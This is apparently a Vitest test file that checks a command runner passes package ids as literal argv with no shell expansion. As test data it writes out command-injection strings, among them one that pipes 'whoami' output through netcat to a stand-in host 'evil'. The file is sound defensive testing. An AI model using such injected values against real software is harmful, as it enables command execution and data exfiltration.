import { describe, expect, it } from "vitest";
import { run } from "../../src/core/runner.js";

/**
 * Defense-in-depth: prove that the runner forwards argv as a single argv vector
 * (no shell parsing), so package ids containing shell metacharacters cannot
 * spawn extra commands. If someone reintroduces `shell: true` here, these
 * tests blow up.
 */
describe("runner argv hardening", () => {
  it("treats shell metacharacters as literal argv (no command substitution)", async () => {
    // Round-trip: stdout must equal argv[1] byte-for-byte. If shell-parsed,
    // the ';' would split into two commands and stdout would NOT equal the
    // input (output of the second command would also appear, or argv[1]
    // would be truncated at the ';').
    const payload = "harmless; echo SHOULD_NOT_RUN";
    const res = await run(process.execPath, [
      "-e",
      "process.stdout.write(JSON.stringify(process.argv.slice(1)))",
      payload,
    ]);
    expect(res.failed).toBe(false);
    expect(JSON.parse(res.stdout)).toEqual([payload]);
  });

  it("does not expand environment variable syntax in arguments", async () => {
    const payload = "$HOME and %USERPROFILE%";
    const res = await run(process.execPath, [
      "-e",
      "process.stdout.write(JSON.stringify(process.argv.slice(1)))",
      payload,
    ]);
    expect(JSON.parse(res.stdout)).toEqual([payload]);
  });

  it("preserves backticks and pipes verbatim", async () => {
    const payload = "`whoami` | nc evil 4444";
    const res = await run(process.execPath, [
      "-e",
      "process.stdout.write(JSON.stringify(process.argv.slice(1)))",
      payload,
    ]);
    expect(JSON.parse(res.stdout)).toEqual([payload]);
  });
});
